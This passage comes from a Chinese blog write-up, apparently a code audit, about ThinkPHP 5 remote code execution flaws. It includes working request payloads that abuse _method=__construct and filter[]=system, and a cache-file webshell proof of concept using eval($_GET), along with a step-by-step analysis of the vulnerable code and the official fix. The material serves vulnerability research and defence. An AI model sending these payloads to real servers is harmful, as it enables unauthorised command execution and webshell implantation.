+<span class="hljs-selector-tag">a</span>可以替换成get<span class="hljs-selector-attr">[]</span>、route<span class="hljs-selector-attr">[]</span>或者其他名字</code></pre>
+<p><strong>ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</strong></p>
+<pre><code class="hljs bash">POST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=<span class="hljs-built_in">ls</span> -al</code></pre>
+<p><strong>ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</strong></p>
+<pre><code class="hljs scss">POST /?s=captcha HTTP/<span class="hljs-number">1.1</span>
+
+_method=__construct&amp;<span class="hljs-attribute">filter</span><span class="hljs-selector-attr">[]</span>=system&amp;method=get&amp;get<span class="hljs-selector-attr">[]</span>=ls+-al_method=__construct&amp;<span class="hljs-attribute">filter</span><span class="hljs-selector-attr">[]</span>=system&amp;method=get&amp;server<span class="hljs-selector-attr">[REQUEST_METHOD]</span>=ls
+<span class="hljs-comment">//get[]可以换成route[]</span></code></pre>
+<p><strong>ThinkPHP 5.1.x</strong></p>
+<pre><code class="hljs ini"><span class="hljs-attr">a</span>=system&amp;_method=filter&amp;c=whoami</code></pre>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>分析例子</p>
+<pre><code class="hljs scss">POST /?s=index
+
+_method=__construct&amp;<span class="hljs-attribute">filter</span><span class="hljs-selector-attr">[]</span>=system&amp;method=get&amp;get<span class="hljs-selector-attr">[]</span>=ipconfig</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614100243801.png" alt="image-20240614100243801"></p>
+<p>老地方下断点</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614100639450.png" alt="image-20240614100639450"></p>
+<p>跟进path之后再进入pathinfo</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614100707894.png" alt="image-20240614100707894"></p>
+<p>这里由于我们采用的兼容模式，因此PATH_INFO赋值为了index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614100950503.png" alt="image-20240614100950503"></p>
+<p>最后经过三目运算符的处理，app.php的pathinfo变量成为了index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614101054737.png" alt="image-20240614101054737"></p>
+<p>经过正则的处理，最后path也是index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614101218386.png" alt="image-20240614101218386"></p>
+<p>导入对应的路由配置</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614103611594.png" alt="image-20240614103611594"></p>
+<p>跟进check</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614104743959.png" alt="image-20240614104743959"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614105200213.png" alt="image-20240614105200213"></p>
+<p>经过路由检测之后，跟进parseUrl</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614111103759.png" alt="image-20240614111103759"></p>
+<p>最终返回module：index</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614112048388.png" alt="image-20240614112048388"></p>
+<p>回到开始，跟进exec</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614112140906.png" alt="image-20240614112140906"></p>
+<p>跟进module</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614112201820.png" alt="image-20240614112201820"></p>
+<p>前面是进行模块的初始化，获取相应的控制器名， 操作名等等，接着跟进invokeMethod</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614112725891.png" alt="image-20240614112725891"></p>
+<p>如下图，先利用反射函数获取到Index类对应的index方法</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614112920532.png" alt="image-20240614112920532"></p>
+<p>然后到这里问题出现了，我发现payload已经被执行了，分析过程失败。看文章重新分析。。。。。</p>
+<p>我们回到最开始的断点，跟进之后，来到这里跟进check</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614113249060.png" alt="image-20240614113249060"></p>
+<p>这里payload也说，问题出在request-&gt;method这个地方，我们跟进之后的确发现，这里调用了这个函数，我们继续跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614113524432.png" alt="image-20240614113524432"></p>
+<p>这里请求类型不存在，因此进入else语句，然后判断var_method是否存在post传参</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614113816468.png" alt="image-20240614113816468"></p>
+<p>查看config.php发现这个的值默认为_method，而我们的payload将其赋值为了__construct</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614113732821.png" alt="image-20240614113732821"></p>
+<p>因此这里request.php中的method变量被赋值为了__construct</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614165712898.png" alt="image-20240614165712898"></p>
+<pre><code class="hljs scss"><span class="hljs-variable">$this</span>-&gt;{<span class="hljs-variable">$this</span>-&gt;method}($_POST);</code></pre>
+<p>其中这一段代码表示的是调用本对象的__construct构造函数，然后给这个函数传参的是POST数组</p>
+<p>接着我们跟进这个构造函数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614171943616.png" alt="image-20240614171943616"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614172044007.png" alt="image-20240614172044007"></p>
+<p>这里可以利用foreach发生变量覆盖，先是判断本对象是否存在这些属性。存在的话，就进行变量的覆盖</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614172252272.png" alt="image-20240614172252272"></p>
+<p>随后利用file_get_contents函数保存post传入的数据</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614172354022.png" alt="image-20240614172354022"></p>
+<p>根据参考文章说，这里需要重点关注**Request::param()**方法，当我们在开启了debug模式的话，这里就会进入这个Log::record，从而调用到param函数，即使没有开启这个模式，后面的exec其中也包含这个方法</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614172819094.png" alt="image-20240614172819094"></p>
+<p>这个方法我们需要特别关注了，因为 <strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p>
+<p>我们先跟进param函数分析一下，这里跟进post</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614173346025.png" alt="image-20240614173346025"></p>
+<p>发现最后调用了array_walk_recursive，这里根据参数情况，可以知道</p>
+<p>调用的函数是本类的filterValue函数，然后传入的参数分别为data数组（键值作为第一个参数，键名作为第二个参数），filter作为第三个参数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614174424646.png" alt="image-20240614174424646"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614174738261.png" alt="image-20240614174738261"></p>
+<p>跟进之后，这里利用foreach循环，循环判断filter是否是方法，然后调用call_user_func执行函数，参数为value</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614174504940.png" alt="image-20240614174504940"></p>
+<p>这里调用完，经过了filterEXP函数的过滤，跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614174520637.png" alt="image-20240614174520637"></p>
+<p>发现就是针对sql注入的过滤，对我们的RCE没影响</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614174527435.png" alt="image-20240614174527435"></p>
+<p>借个图片阐述这个RCE的链子</p>
+<p>首先实在method函数中，没有判断method参数的值，导致我们可以给其任意赋值（这里是__construct），随后就顺其自然的调用了本身的构造函数，其中参数是post数组，而构造函数中，也没有对post数组做出过滤，并且还是一个变量覆盖（在foreach循环下），这意味着我们可以构造覆盖任意我们想要覆盖的变量了（这里是要覆盖类的任意属性），之后就调用到了filterValue函数，随后没有过滤的前提下，调用call_user_func函数，我们只需要重点关注这个函数所传入的参数即可，想办法覆盖这两个参数为我们想要的值。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614180506780.png" alt="image-20240614180506780"></p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<p>对于修补的方式，官方是采用了白名单校验</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614180617071.png" alt="image-20240614180617071"></p>
+<p>高一点的版本默认是不开启app_debug调式模式的，但是其中的exec内部也跟上面的链子一样，这里直接放个图片了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614184815645.png" alt="image-20240614184815645"></p>
+<p>可以看到这里exec中调用了request的param方法，剩下就和上面的一样了</p>
+<h2 id="rce3-cache缓存文件写webshell">RCE3-Cache缓存文件写webshell</h2>
+<h3 id="概述">概述</h3>
+<p>本次漏洞存在于 <strong>ThinkPHP</strong> 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 <strong>.php</strong> 文件中，攻击者通过精心构造的 <strong>payload</strong> ，即可将 <strong>webshell</strong> 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 <strong>远程代码执行漏洞</strong> 。漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong> 。</p>
+<p>POC如下：</p>
+<pre><code class="hljs scss">http://localhost/tpdemo/public/?username=hybcx123%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a@<span class="hljs-built_in">eval</span>($_GET[_]);<span class="hljs-comment">// </span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614225633953.png" alt="image-20240614225633953"></p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>在我们的index下面下断点，跟进set</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614225715239.png" alt="image-20240614225715239"></p>
+<p>这里首先是判断了我们当前使用的命名空间：<code>use think\Cache;</code>，然后包含了对应的PHP文件Cache.php</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614225813491.png" alt="image-20240614225813491"></p>
+<p>继续跟进到了input函数，这里得到了我们请求的方法（是get），然后调用了request类的get方法</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614230015768.png" alt="image-20240614230015768"></p>
+<p>继续跟进，我们get传参进去的内容（也就是最终的webshell）被赋值给了get变量</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614230104455.png" alt="image-20240614230104455"></p>
+<p>经过一些列过滤之后（过滤器对最终结果没影响），继续了一个强制类型转换（转化为了string），然后返回了数据</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614230620441.png" alt="image-20240614230620441"></p>
+<p>接着到了Cache类的set方法，继续跟进到了file.php的set方法。</p>
